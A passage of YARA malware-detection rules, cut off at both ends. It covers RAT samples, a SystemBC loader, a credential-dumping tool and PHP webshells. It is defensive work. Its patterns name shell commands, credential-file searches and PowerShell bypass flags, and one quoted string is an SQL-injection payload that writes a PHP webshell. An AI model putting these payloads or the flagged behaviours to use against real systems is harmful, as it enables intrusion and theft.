isWeakRule = true
strings:
//IOC patterns
$req0 = "MyfontRegularCalligraphr : Myfont Regular : 22-02-2023Myfont RegularVersion 001.001Myfont-RegularCreated with Calligraphr.com"
$req1 = "mMyfontRegularCalligraphr : Myfont Regular : 22-02-2023Myfont RegularVersion 001.001Myfont-RegularCreated with Calligraphr.com"
//optional strings
$opt0 = "AcquireSRWLockExclusive"
$opt1 = "AreFileApisANSI"
$opt2 = "CallWindowProcA"
$opt3 = "CloseClipboard"
$opt4 = "CloseThreadpoolTimer"
$opt5 = "CloseThreadpoolWait"
$opt6 = "CreateEventExW"
$opt7 = "CreateEventW"
$opt8 = "CreateFileW"
$opt9 = "CreateProcessW"
$opt10 = "CreateRemoteThread"
$opt11 = "CreateSemaphoreExW"
$opt12 = "CreateSemaphoreW"
$opt13 = "CreateSymbolicLinkW"
$opt14 = "CreateThreadpoolTimer"
$opt15 = "CreateThreadpoolWait"
$opt16 = "CreateThreadpoolWork"
$opt17 = "CreateToolhelp32Snapshot"
$opt18 = "DecodePointer"
$opt19 = "DeleteCriticalSection"
$opt20 = "EmptyClipboard"
$opt21 = "EncodePointer"
$opt22 = "EnterCriticalSection"
$opt23 = "EnumSystemLocalesEx"
$opt24 = "EnumSystemLocalesW"
$opt25 = "ExitProcess"
$opt26 = "FindFirstFileExW"
$opt27 = "FindNextFileW"
$opt28 = "FindWindowA"
$opt29 = "FlushFileBuffers"
$opt30 = "FlushInstructionCache"
$opt31 = "FlushProcessWriteBuffers"
$opt32 = "FreeEnvironmentStringsW"
$opt33 = "FreeLibrary"
$opt34 = "FreeLibraryWhenCallbackReturns"
$opt35 = "GetAsyncKeyState"
$opt36 = "GetClipboardData"
$opt37 = "GetCommandLineA"
$opt38 = "GetCommandLineW"
$opt39 = "GetConsoleMode"
$opt40 = "GetConsoleOutputCP"
$opt41 = "GetCurrentPackageId"
$opt42 = "GetCurrentProcess"
$opt43 = "GetCurrentProcessId"
$opt44 = "GetCurrentProcessorNumber"
$opt45 = "GetCurrentThreadId"
$opt46 = "GetCursorPos"
$opt47 = "GetEnvironmentStringsW"
$opt48 = "GetExitCodeProcess"
$opt49 = "GetFileAttributesExW"
$opt50 = "GetFileInformationByHandleEx"
$opt51 = "GetFileSizeEx"
$opt52 = "GetFileType"
$opt53 = "GetForegroundWindow"
$opt54 = "GetKeyState"
$opt55 = "GetLastError"
$opt56 = "GetLocaleInfoW"
$opt57 = "GetModuleFileNameW"
$opt58 = "GetModuleHandleA"
$opt59 = "GetModuleHandleExW"
$opt60 = "GetModuleHandleW"
$opt61 = "GetProcAddress"
$opt62 = "GetProcessHeap"
$opt63 = "GetStartupInfoW"
$opt64 = "GetStdHandle"
$opt65 = "GetStringTypeW"
$opt66 = "GetSystemInfo"
$opt67 = "GetSystemTimeAsFileTime"
$opt68 = "GetSystemTimePreciseAsFileTime"
$opt69 = "GetThreadContext"
$opt70 = "GetTickCount64"
$opt71 = "GetUserDefaultLCID"
$opt72 = "GetWindowTextA"
$opt73 = "GetWindowTextLengthA"
$opt74 = "GetWindowThreadProcessId"
$opt75 = "GlobalAlloc"
$opt76 = "GlobalFree"
$opt77 = "GlobalLock"
$opt78 = "GlobalUnlock"
$opt79 = "HeapCreate"
$opt80 = "HeapDestroy"
$opt81 = "HeapReAlloc"
$opt82 = "ImmGetContext"
$opt83 = "InitOnceExecuteOnce"
$opt84 = "InitializeConditionVariable"
$opt85 = "InitializeCriticalSectionAndSpinCount"
$opt86 = "InitializeCriticalSectionEx"
$opt87 = "InitializeSListHead"
$opt88 = "InitializeSRWLock"
$opt89 = "InterlockedFlushSList"
$opt90 = "IsDebuggerPresent"
$opt91 = "IsProcessorFeaturePresent"
$opt92 = "KERNEL32.dll"
$opt93 = "LCMapStringW"
$opt94 = "LeaveCriticalSection"
$opt95 = "LoadCursorA"
$opt96 = "LoadLibraryA"
$opt97 = "LoadLibraryExW"
$opt98 = "MSVCP140.dll"
$opt99 = "OPENGL32.dll"
$opt100 = "OpenClipboard"
$opt101 = "OpenProcess"
$opt102 = "OpenThread"
$opt103 = "Process32Next"
$opt104 = "QueryPerformanceCounter"
$opt105 = "QueryPerformanceFrequency"
$opt106 = "RaiseException"
$opt107 = "ReadConsoleW"
$opt108 = "ReleaseSRWLockExclusive"
$opt109 = "ResetEvent"
$opt110 = "ResumeThread"
$opt111 = "RtlCaptureContext"
$opt112 = "RtlLookupFunctionEntry"
$opt113 = "RtlPcToFileHeader"
$opt114 = "RtlVirtualUnwind"
$opt115 = "SetClipboardData"
$opt116 = "SetConsoleTitleA"
$opt117 = "SetCursorPos"
$opt118 = "SetEndOfFile"
$opt119 = "SetEnvironmentVariableW"
$opt120 = "SetFileInformationByHandle"
$opt121 = "SetFilePointerEx"
$opt122 = "SetLastError"
$opt123 = "SetStdHandle"
$opt124 = "SetThreadContext"
$opt125 = "SetThreadpoolTimer"
$opt126 = "SetThreadpoolWait"
$opt127 = "SetUnhandledExceptionFilter"
$opt128 = "SetWindowLongPtrA"
$opt129 = "SleepConditionVariableCS"
$opt130 = "SleepConditionVariableSRW"
$opt131 = "SubmitThreadpoolWork"
$opt132 = "SuspendThread"
$opt133 = "SystemFunction036"
$opt134 = "TerminateProcess"
$opt135 = "Thread32First"
$opt136 = "Thread32Next"
$opt137 = "TlsGetValue"
$opt138 = "TlsSetValue"
$opt139 = "TryAcquireSRWLockExclusive"
$opt140 = "USER32.dll"
$opt141 = "UnhandledExceptionFilter"
$opt142 = "VCRUNTIME140.dll"
$opt143 = "VirtualAlloc"
$opt144 = "VirtualAllocEx"
$opt145 = "VirtualFree"
$opt146 = "VirtualFreeEx"
$opt147 = "VirtualProtect"
$opt148 = "VirtualQuery"
$opt149 = "WaitForSingleObject"
$opt150 = "WaitForSingleObjectEx"
$opt151 = "WaitForThreadpoolTimerCallbacks"
$opt152 = "WakeAllConditionVariable"
$opt153 = "WakeConditionVariable"
$opt154 = "WriteConsoleW"
$opt155 = "WriteProcessMemory"
$opt156 = "kernel32.dll"
$opt157 = "mscoree.dll"
$opt158 = "read only file system"
condition:
//require 50% of optional strings
uint16(0) == 0x5A4D and filesize > 100KB and filesize < 7777KB and 1 of ($req*) and 50 of ($opt*)
}
rule SSC_Und_WmIx_AntiVmX
{
strings:
$s1 = "winmgmts"
$s2 = "Win32_Process"
$s3 = "Win32_ProcessStartup"
condition:
all of them and filesize > 50KB and filesize < 5555KB
}
rule SSC_AutoGen_XlS_a28a6f2c_Unsafe
{
meta:
author = "FileScan.IO Engine v1.1.0-b701aba"
date = "2023-03-21"
sample = "a28a6f2c381686bdd94a775f954d82d71fcdcf6d1836b9bb34c78d592fc55c91"
score = 100
tags = "cmd,macros"
isWeakRule = false
strings:
$magicBytes = {D0 CF 11 E0 A1 B1 1A E1}
//IOC patterns
$req0 = "Viet Ha;opswatchannel@OPSWAT2017.onmicrosoft.com"
$req1 = "http://google.com/"
$req2 = "http://metadefender.com/"
$req3 = "not as boring as watching ) Tj\r\nET\r\nBT\r\n/F1 0010 Tf\r\n69.2500 652.7520 Td\r\n( paint dry. And more text. And more text. And more te"
$req4 = "{9B63F701-A616-4994-A99A-EB38719733A1}"
condition:
//
$magicBytes at 0 and filesize > 225332 and filesize < 275404 and all of ($req*)
}
rule SSC_AutoGen_Win_RatObf_5b68e970_NanoCx
{
meta:
author = "FileScan.IO Engine v1.1.0-b701aba"
date = "2023-03-21"
sample = "5b68e9707ce610dc2f8684699473b677b7d9ee8893d8030716cc091fa8763b04"
score = 100
tags = "rat,obfuscated,packed,schtasks.exe"
isWeakRule = true
strings:
//IOC patterns
$req0 = "$06e355df-dcb1-46af-a5eb-2a2de03fbe2a"
//optional strings
$opt0 = "AllocConsole"
$opt1 = "AsyncCallback"
$opt2 = "BeginInvoke"
$opt3 = "CreateDecryptor"
$opt4 = "CreateDirectory"
$opt5 = "CreateEncryptor"
$opt6 = "CreatePipe"
$opt7 = "DESCryptoServiceProvider"
$opt8 = "DeleteFile"
$opt9 = "DnsQuery_A"
$opt10 = "FindResourceEx"
$opt11 = "GetCurrentProcess"
$opt12 = "GetKernelObjectSecurity"
$opt13 = "GetProcessImageFileName"
$opt14 = "GetTempFileName"
$opt15 = "ICryptoTransform"
$opt16 = "LoadResource"
$opt17 = "LockResource"
$opt18 = "MD5CryptoServiceProvider"
$opt19 = "MemoryStream"
$opt20 = "NtSetInformationProcess"
$opt21 = "OpenProcess"
$opt22 = "ProcessStartInfo"
$opt23 = "QueryDosDevice"
$opt24 = "QueueUserWorkItem"
$opt25 = "RegCloseKey"
$opt26 = "RegOpenKeyEx"
$opt27 = "RegQueryValueEx"
$opt28 = "RegistryKey"
$opt29 = "RijndaelManaged"
$opt30 = "SetKernelObjectSecurity"
$opt31 = "SetThreadExecutionState"
$opt32 = "SizeofResource"
$opt33 = "System.Security.AccessControl"
$opt34 = "WriteAllBytes"
$opt35 = "WriteAllText"
$opt36 = "advapi32.dll"
$opt37 = "dnsapi.dll"
$opt38 = "get_ExecutablePath"
$opt39 = "kernel32.dll"
$opt40 = "mscoree.dll"
$opt41 = "set_UseShellExecute"
condition:
//require 75% of optional strings
uint16(0) == 0x5A4D and filesize > 100KB and filesize < 1800KB and all of ($req*) and 31 of ($opt*)
}
rule SSC_Win_SystembcX_20220311_LoaderX {
meta:
author = "Thomas Barabosch, Deutsche Telekom Security"
twitter = "https://twitter.com/DTCERT"
description = "Detects unpacked SystemBC module"
date = "20220311"
sharing = "TLP:WHITE"
malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.systembc"
reference_1 = "https://twitter.com/Cryptolaemus1/status/1502069552246575105"
reference_2 = "https://medium.com/walmartglobaltech/inside-the-systembc-malware-as-a-service-9aa03afd09c6"
hash_1 = "c926338972be5bdfdd89574f3dc2fe4d4f70fd4e24c1c6ac5d2439c7fcc50db5"
in_memory = "True"
strings:
$sx1 = "-WindowStyle Hidden -ep bypass -file" ascii
$sx2 = "BEGINDATA" ascii
$sx3 = "GET %s HTTP/1.0" ascii
/*
$s1 = "TOR:" ascii
$s2 = "PORT1:" ascii
$s3 = "HOST1:" ascii
*/
$s5 = "User-Agent:" ascii
/* $s6 = "powershell" ascii */
$s8 = "ALLUSERSPROFILE" ascii
condition:
( uint16(0) == 0x5a4d and filesize < 30KB and 2 of ($sx*) ) or all of them
}
rule SSC_HKTL_Amplia_Security_Tool
{
meta:
description = "Detects Amplia Security Tool like Windows Credential Editor"
score = 60
nodeepdive = 1
author = "Florian Roth"
date = "2013-01-01"
modified = "2023-02-14"
strings:
$a = "Amplia Security"
$c = "getlsasrvaddr.exe"
$d = "Cannot get PID of LSASS.EXE"
$e = "extract the TGT session key"
$f = "PPWDUMP_DATA"
condition:
uint16(0) == 0x5a4d and
filesize < 3000KB and (
2 of them
) or 3 of them
}
rule SSC_MITRE_AutoGen_012432
{
strings:
$s1 = "Set"
$s2 = "CASMailbox"
$s4 = "http" nocase
condition:
all of them and filesize > 300 and filesize < 700KB
}
rule SSC_Unauthorized_Proxy_Server_RAT {
meta:
author = "US-CERT Code Analysis Team"
reference = "https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity"
hash1 = "C74E289AD927E81D2A1A56BC73E394AB"
hash2 = "2950E3741D7AF69E0CA0C5013ABC4209"
desscription = "Detects Proxy Server RAT"
strings:
$s0 = {8A043132C288043125FF00000003C299F73D40404900A14440490003D0413BCF72DE5E5FC3}
$s1 = {8A04318844241432C28804318B44241425FF00000003C299F73D40404900A14440490003D0413BCF72D65E5FC3}
$s2 = {8A04318844241432C28804318B44241425FF00000003C299F73D5C394100A16039410003D0413BCF72D65E5FC3}
$s3 = {8A043132C288043125FF00000003C299F73D5C394100A16039410003D0413BCF72DE5E5FC3}
$s4 = {B91A7900008A140780F29A8810404975F4}
$s5 = {399FE192769F839DCE9F2A9D2C9EAD9CEB9FD19CA59F7E9F539CEF9F029F969C6C9E5C9D949FC99F}
$s6 = {8A04318844241432C28804318B44241425FF00000003C299F73D40600910A14460091003D0413BCF72D65E5FC3}
$s7 = {3C5C75208A41014184C074183C72740C3C7474083C6274043C2275088A41014184C075DC}
$s8 = {8B063D9534120077353D59341200722E668B4604663DE8037F24}
$s9 = {8BC88B74241CC1E1052BC88B7C2418C1E1048B5C241403C88D04888B4C242083F9018944240C7523}
$s10 = {8B063D9034120077353D59341200722E668B4604663DE8037F246685C0}
$s11 = {30110FB60148FFC102C20FBEC09941F7F94103D249FFC875E7}
$s12 = {448BE8B84FECC44E41F7EDC1FA038BCAC1E91F03D16BD21A442BEA4183C541}
$s13 = {8A0A80F9627C2380F9797F1E80F9647C0A80F96D7F0580C10BEB0D80F96F7C0A80F9787F05}
condition:
any of them
}
rule SSC_Swebshell_php_generic
{
meta:
description = "php webshell having some kind of input and some kind of payload. restricted to small files or big ones inclusing suspicious strings"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/14"
modified = "2022-08-22"
hash = "bee1b76b1455105d4bfe2f45191071cf05e83a309ae9defcf759248ca9bceddd"
strings:
$wfp_tiny1 = "escapeshellarg" fullword
$wfp_tiny2 = "addslashes" fullword
//strings from private rule php_false_positive_tiny
// try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
//$gfp_tiny1 = "addslashes" fullword
//$gfp_tiny2 = "escapeshellarg" fullword
$gfp_tiny3 = "include \"./common.php\";" // xcache
$gfp_tiny4 = "assert('FALSE');"
$gfp_tiny5 = "assert(false);"
$gfp_tiny6 = "assert(FALSE);"
$gfp_tiny7 = "assert('array_key_exists("
$gfp_tiny8 = "echo shell_exec($aspellcommand . ' 2>&1');"
$gfp_tiny9 = "throw new Exception('Could not find authentication source with id ' . $sourceId);"
$gfp_tiny10= "return isset( $_POST[ $key ] ) ? $_POST[ $key ] : ( isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $default );"
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
//strings from private rule capa_php_input
$inp1 = "php://input" wide ascii
$inp2 = /_GET\s?\[/ wide ascii
// for passing $_GET to a function
$inp3 = /\(\s?\$_GET\s?\)/ wide ascii
$inp4 = /_POST\s?\[/ wide ascii
$inp5 = /\(\s?\$_POST\s?\)/ wide ascii
$inp6 = /_REQUEST\s?\[/ wide ascii
$inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
// PHP automatically adds all the request headers into the $_SERVER global array, prefixing each header name by the "HTTP_" string, so e.g. @eval($_SERVER['HTTP_CMD']) will run any code in the HTTP header CMD
$inp15 = "_SERVER['HTTP_" wide ascii
$inp16 = "_SERVER[\"HTTP_" wide ascii
$inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
$inp18 = "array_values($_SERVER)" wide ascii
$inp19 = /file_get_contents\("https?:\/\// wide ascii
//strings from private rule capa_php_payload
// \([^)] to avoid matching on e.g. eval() in comments
$cpayload1 = /\beval[\t ]*\([^)]/ nocase wide ascii
$cpayload2 = /\bexec[\t ]*\([^)]/ nocase wide ascii
$cpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload4 = /\bpassthru[\t ]*\([^)]/ nocase wide ascii
$cpayload5 = /\bsystem[\t ]*\([^)]/ nocase wide ascii
$cpayload6 = /\bpopen[\t ]*\([^)]/ nocase wide ascii
$cpayload7 = /\bproc_open[\t ]*\([^)]/ nocase wide ascii
$cpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload9 = /\bassert[\t ]*\([^)0]/ nocase wide ascii
$cpayload10 = /\bpreg_replace[\t ]*\(.{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
$cpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload13 = /\bmb_eregi_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase wide ascii
$cpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase wide ascii
$m_cpayload_preg_filter1 = /\bpreg_filter[\t ]*\([^\)]/ nocase wide ascii
$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
// TODO backticks
//strings from private rule capa_gen_sus
// these strings are just a bit suspicious, so several of them are needed, depending on filesize
$gen_bit_sus1  = /:\s{0,20}eval}/ nocase wide ascii
$gen_bit_sus2  = /\.replace\(\/\w\/g/ nocase wide ascii
$gen_bit_sus6  = "self.delete"
$gen_bit_sus9  = "\"cmd /c" nocase
$gen_bit_sus10 = "\"cmd\"" nocase
$gen_bit_sus11 = "\"cmd.exe" nocase
$gen_bit_sus12 = "%comspec%" wide ascii
$gen_bit_sus13 = "%COMSPEC%" wide ascii
//TODO:$gen_bit_sus12 = ".UserName" nocase
$gen_bit_sus18 = "Hklm.GetValueNames();" nocase
// bonus string for proxylogon exploiting webshells
$gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
$gen_bit_sus21 = "\"upload\"" wide ascii
$gen_bit_sus22 = "\"Upload\"" wide ascii
$gen_bit_sus23 = "UPLOAD" fullword wide ascii
$gen_bit_sus24 = "fileupload" wide ascii
$gen_bit_sus25 = "file_upload" wide ascii
// own base64 func
$gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
$gen_bit_sus30 = "serv-u" wide ascii
$gen_bit_sus31 = "Serv-u" wide ascii
$gen_bit_sus32 = "Army" fullword wide ascii
// single letter paramweter
$gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
$gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
$gen_bit_sus35 = "crack" fullword wide ascii
$gen_bit_sus44 = "<pre>" wide ascii
$gen_bit_sus45 = "<PRE>" wide ascii
$gen_bit_sus46 = "shell_" wide ascii
$gen_bit_sus47 = "Shell" fullword wide ascii
$gen_bit_sus50 = "bypass" wide ascii
$gen_bit_sus51 = "suhosin" wide ascii
$gen_bit_sus52 = " ^ $" wide ascii
$gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
$gen_bit_sus55 = /\w'\.'\w/ wide ascii
$gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
$gen_bit_sus57 = "dumper" wide ascii
$gen_bit_sus59 = "'cmd'" wide ascii
$gen_bit_sus60 = "\"execute\"" wide ascii
$gen_bit_sus61 = "/bin/sh" wide ascii
$gen_bit_sus62 = "Cyber" wide ascii
$gen_bit_sus63 = "portscan" fullword wide ascii
//$gen_bit_sus64 = "\"command\"" fullword wide ascii
//$gen_bit_sus65 = "'command'" fullword wide ascii
$gen_bit_sus66 = "whoami" fullword wide ascii
$gen_bit_sus67 = "$password='" fullword wide ascii
$gen_bit_sus68 = "$password=\"" fullword wide ascii
$gen_bit_sus69 = "$cmd" fullword wide ascii
$gen_bit_sus70 = "\"?>\"." fullword wide ascii
$gen_bit_sus71 = "Hacking" fullword wide ascii
$gen_bit_sus72 = "hacking" fullword wide ascii
$gen_bit_sus73 = ".htpasswd" wide ascii
$gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii
// very suspicious strings, one is enough
$gen_much_sus7  = "Web Shell" nocase
$gen_much_sus8  = "WebShell" nocase
$gen_much_sus3  = "hidded shell"
$gen_much_sus4  = "WScript.Shell.1" nocase
$gen_much_sus5  = "AspExec"
$gen_much_sus14 = "\\pcAnywhere\\" nocase
$gen_much_sus15 = "antivirus" nocase
$gen_much_sus16 = "McAfee" nocase
$gen_much_sus17 = "nishang"
$gen_much_sus18 = "\"unsafe" fullword wide ascii
$gen_much_sus19 = "'unsafe" fullword wide ascii
$gen_much_sus24 = "exploit" fullword wide ascii
$gen_much_sus25 = "Exploit" fullword wide ascii
$gen_much_sus26 = "TVqQAAMAAA" wide ascii
$gen_much_sus30 = "Hacker" wide ascii
$gen_much_sus31 = "HACKED" fullword wide ascii
$gen_much_sus32 = "hacked" fullword wide ascii
$gen_much_sus33 = "hacker" wide ascii
$gen_much_sus34 = "grayhat" nocase wide ascii
$gen_much_sus35 = "Microsoft FrontPage" wide ascii
$gen_much_sus36 = "Rootkit" wide ascii
$gen_much_sus37 = "rootkit" wide ascii
$gen_much_sus38 = "/*-/*-*/" wide ascii
$gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
$gen_much_sus40 = "\"e\"+\"v" wide ascii
$gen_much_sus41 = "a\"+\"l\"" wide ascii
$gen_much_sus42 = "\"+\"(\"+\"" wide ascii
$gen_much_sus43 = "q\"+\"u\"" wide ascii
$gen_much_sus44 = "\"u\"+\"e" wide ascii
$gen_much_sus45 = "/*//*/" wide ascii
$gen_much_sus46 = "(\"/*/\"" wide ascii
$gen_much_sus47 = "eval(eval(" wide ascii
// self remove
$gen_much_sus48 = "unlink(__FILE__)" wide ascii
$gen_much_sus49 = "Shell.Users" wide ascii
$gen_much_sus50 = "PasswordType=Regular" wide ascii
$gen_much_sus51 = "-Expire=0" wide ascii
$gen_much_sus60 = "_=$$_" wide ascii
$gen_much_sus61 = "_=$$_" wide ascii
$gen_much_sus62 = "++;$" wide ascii
$gen_much_sus63 = "++; $" wide ascii
$gen_much_sus64 = "_.=$_" wide ascii
$gen_much_sus70 = "-perm -04000" wide ascii
$gen_much_sus71 = "-perm -02000" wide ascii
$gen_much_sus72 = "grep -li password" wide ascii
$gen_much_sus73 = "-name config.inc.php" wide ascii
// touch without parameters sets the time to now, not malicious and gives fp
$gen_much_sus75 = "password crack" wide ascii
$gen_much_sus76 = "mysqlDll.dll" wide ascii
$gen_much_sus77 = "net user" wide ascii
$gen_much_sus78 = "suhosin.executor.disable_" wide ascii
$gen_much_sus79 = "disabled_suhosin" wide ascii
$gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
$gen_much_sus81 = /strrev\(['"]/ wide ascii
$gen_much_sus82 = "PHPShell" fullword wide ascii
$gen_much_sus821= "PHP Shell" fullword wide ascii
$gen_much_sus83 = "phpshell" fullword wide ascii
$gen_much_sus84 = "PHPshell" fullword wide ascii
$gen_much_sus87 = "deface" wide ascii
$gen_much_sus88 = "Deface" wide ascii
$gen_much_sus89 = "backdoor" wide ascii
$gen_much_sus90 = "r00t" fullword wide ascii
$gen_much_sus91 = "xp_cmdshell" fullword wide ascii
$gif = { 47 49 46 38 }
//strings from private rule capa_php_payload_multiple
// \([^)] to avoid matching on e.g. eval() in comments
$cmpayload1 = /\beval[\t ]*\([^)]/ nocase wide ascii
$cmpayload2 = /\bexec[\t ]*\([^)]/ nocase wide ascii
$cmpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase wide ascii
$cmpayload4 = /\bpassthru[\t ]*\([^)]/ nocase wide ascii
$cmpayload5 = /\bsystem[\t ]*\([^)]/ nocase wide ascii
$cmpayload6 = /\bpopen[\t ]*\([^)]/ nocase wide ascii
$cmpayload7 = /\bproc_open[\t ]*\([^)]/ nocase wide ascii
$cmpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase wide ascii
$cmpayload9 = /\bassert[\t ]*\([^)0]/ nocase wide ascii
$cmpayload10 = /\bpreg_replace[\t ]*\([^\)]{1,100}\/e/ nocase wide ascii
$cmpayload11 = /\bpreg_filter[\t ]*\([^\)]{1,100}\/e/ nocase wide ascii
$cmpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cmpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase wide ascii
$cmpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase wide ascii
$fp1 = "# Some examples from obfuscated malware:" ascii
condition:
not (
any of ( $gfp_tiny* )
or 1 of ($fp*)
)
and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and (
any of ( $inp* )
)
and (
any of ( $cpayload* ) or
all of ( $m_cpayload_preg_filter* )
)
and
( ( filesize < 1000 and not any of ( $wfp_tiny* ) ) or
( (
$gif at 0 or
(
filesize < 4KB and
(
1 of ( $gen_much_sus* ) or
2 of ( $gen_bit_sus* )
)
) or (
filesize < 20KB and
(
2 of ( $gen_much_sus* ) or
3 of ( $gen_bit_sus* )
)
) or (
filesize < 50KB and
(
2 of ( $gen_much_sus* ) or
4 of ( $gen_bit_sus* )
)
) or (
filesize < 100KB and
(
2 of ( $gen_much_sus* ) or
6 of ( $gen_bit_sus* )
)
) or (
filesize < 150KB and
(
3 of ( $gen_much_sus* ) or
7 of ( $gen_bit_sus* )
)
) or (
filesize < 500KB and
(
4 of ( $gen_much_sus* ) or
8 of ( $gen_bit_sus* )
)
)
)
and
( filesize > 5KB or not any of ( $wfp_tiny* ) ) ) or
( filesize < 500KB and (
4 of ( $cmpayload* )
)
) )
}
rule SSC_Swebshell_php_generic_callback
{
meta:
description = "php webshell having some kind of input and using a callback to execute the payload. restricted to small files or would give lots of false positives"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/14"
hash = "e98889690101b59260e871c49263314526f2093f"
strings:
//strings from private rule php_false_positive
// try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
// a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
$gfp1  = "eval(\"return [$serialised_parameter" // elgg
$gfp2  = "$this->assert(strpos($styles, $"
$gfp3  = "$module = new $_GET['module']($_GET['scope']);"
$gfp4  = "$plugin->$_POST['action']($_POST['id']);"
$gfp5  = "$_POST[partition_by]($_POST["
$gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
$gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
$gfp8  = "Smarty_Internal_Debug::start_render($_template);"
$gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
$gfp11 = "(eval (getenv \"EPROLOG\")))"
$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
//strings from private rule php_false_positive_tiny
// try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
//$gfp_tiny1 = "addslashes" fullword
//$gfp_tiny2 = "escapeshellarg" fullword
$gfp_tiny3 = "include \"./common.php\";" // xcache
$gfp_tiny4 = "assert('FALSE');"
$gfp_tiny5 = "assert(false);"
$gfp_tiny6 = "assert(FALSE);"
$gfp_tiny7 = "assert('array_key_exists("
$gfp_tiny8 = "echo shell_exec($aspellcommand . ' 2>&1');"
$gfp_tiny9 = "throw new Exception('Could not find authentication source with id ' . $sourceId);"
$gfp_tiny10= "return isset( $_POST[ $key ] ) ? $_POST[ $key ] : ( isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $default );"
//strings from private rule capa_php_input
$inp1 = "php://input" wide ascii
$inp2 = /_GET\s?\[/ wide ascii
// for passing $_GET to a function
$inp3 = /\(\s?\$_GET\s?\)/ wide ascii
$inp4 = /_POST\s?\[/ wide ascii
$inp5 = /\(\s?\$_POST\s?\)/ wide ascii
$inp6 = /_REQUEST\s?\[/ wide ascii
$inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
// PHP automatically adds all the request headers into the $_SERVER global array, prefixing each header name by the "HTTP_" string, so e.g. @eval($_SERVER['HTTP_CMD']) will run any code in the HTTP header CMD
$inp15 = "_SERVER['HTTP_" wide ascii
$inp16 = "_SERVER[\"HTTP_" wide ascii
$inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
$inp18 = "array_values($_SERVER)" wide ascii
$inp19 = /file_get_contents\("https?:\/\// wide ascii
//strings from private rule capa_php_callback
$callback1 = /\bob_start[\t ]*\([^)]/ nocase wide ascii
$callback2 = /\barray_diff_uassoc[\t ]*\([^)]/ nocase wide ascii
$callback3 = /\barray_diff_ukey[\t ]*\([^)]/ nocase wide ascii
$callback4 = /\barray_filter[\t ]*\([^)]/ nocase wide ascii
$callback5 = /\barray_intersect_uassoc[\t ]*\([^)]/ nocase wide ascii
$callback6 = /\barray_intersect_ukey[\t ]*\([^)]/ nocase wide ascii
$callback7 = /\barray_map[\t ]*\([^)]/ nocase wide ascii
$callback8 = /\barray_reduce[\t ]*\([^)]/ nocase wide ascii
$callback9 = /\barray_udiff_assoc[\t ]*\([^)]/ nocase wide ascii
$callback10 = /\barray_udiff_uassoc[\t ]*\([^)]/ nocase wide ascii
$callback11 = /\barray_udiff[\t ]*\([^)]/ nocase wide ascii
$callback12 = /\barray_uintersect_assoc[\t ]*\([^)]/ nocase wide ascii
$callback13 = /\barray_uintersect_uassoc[\t ]*\([^)]/ nocase wide ascii
$callback14 = /\barray_uintersect[\t ]*\([^)]/ nocase wide ascii
$callback15 = /\barray_walk_recursive[\t ]*\([^)]/ nocase wide ascii
$callback16 = /\barray_walk[\t ]*\([^)]/ nocase wide ascii
$callback17 = /\bassert_options[\t ]*\([^)]/ nocase wide ascii
